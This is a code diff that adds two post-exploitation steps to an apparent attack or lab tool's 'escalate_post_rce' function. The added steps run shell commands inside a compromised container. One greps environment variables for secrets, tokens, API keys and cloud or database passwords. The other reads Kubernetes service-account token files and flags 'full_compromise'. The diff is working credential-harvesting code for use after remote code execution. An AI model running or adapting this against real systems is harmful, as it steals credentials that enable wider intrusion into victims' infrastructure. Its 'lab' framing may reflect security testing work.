@@ -13387,6 +13387,37 @@ def escalate_post_rce(
     except Exception:
         pass
 
+    # 8. Environment variables — secrets/API keys leakage
+    try:
+        r = lab.sh("exec", lab.wp, "sh", "-c",
+                   "printenv | grep -iE 'secret|token|api_key|access_key|password|pass|db_|aws_|gcp_'"
+                   " | head -20 2>/dev/null", timeout=10)
+        if r.returncode == 0 and r.stdout:
+            _env_lines = [(ln[:200]) for ln in (r.stdout or "").splitlines() if ln.strip()]
+            if _env_lines:
+                result["sensitive_env_vars"] = _env_lines[:10]
+                result["escalation_level"] = "full_compromise"
+                step(f"  post-rce: {len(_env_lines)} variable(s) de entorno sensibles detectadas")
+    except Exception:
+        pass
+
+    # 9. Cloud service tokens (K8s service account, instance metadata credentials)
+    try:
+        _cloud_reads = [
+            ("/var/run/secrets/kubernetes.io/serviceaccount/token", "k8s_sa_token"),
+            ("/run/secrets/kubernetes.io/serviceaccount/token", "k8s_sa_token"),
+        ]
+        for _cpath, _ckey in _cloud_reads:
+            r = lab.sh("exec", lab.wp, "sh", "-c",
+                       f"cat {_cpath} 2>/dev/null | head -c 200", timeout=8)
+            if r.returncode == 0 and r.stdout and len(r.stdout.strip()) > 20:
+                result[_ckey] = r.stdout.strip()[:200]
+                result["escalation_level"] = "full_compromise"
+                step(f"  post-rce: cloud credential found at {_cpath}")
+                break
+    except Exception:
+        pass
+
     return result
 
 
